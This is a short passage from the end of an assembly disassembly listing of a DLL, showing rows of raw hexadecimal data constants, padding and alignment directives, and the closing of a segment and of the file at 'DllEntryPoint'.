		dd 0DF8C4924h, 0AEEFF701h, 96A250F2h, 0E857A6Fh, 0E602C1E4h
		dd 0D8348BB4h, 614F8E7Dh, 0CF3C409Eh, 9A838FF6h, 0F76ED3EFh
		dd 0AB6C01BBh, 1DB321DEh, 0B02902EDh, 4F852C95h, 4AB116DEh
		dd 607399B1h, 1D4DA599h, 66A233C6h, 52197A57h, 3B4766D9h
		dd 1588460Ah, 0FF2DC5E3h, 18DD1BD6h, 94358455h,	0FB2F193h
		dd 20D1FE8Eh, 3274254Dh, 8F883166h, 0BEE5F5C4h,	0F753DA7h
		dd 749905ECh, 92C8E98Fh, 187ADD6Eh, 50441E50h, 0F4446925h
		dd 42BF6A90h, 520977A2h, 0A8A57EE9h, 6AE3CA9h, 8375B069h
		dd 0E16CD0B1h, 1C437A13h, 3F50AD68h, 7B34F95Ch,	74h dup(0)
		align 800h
seg004		ends


		end DllEntryPoint
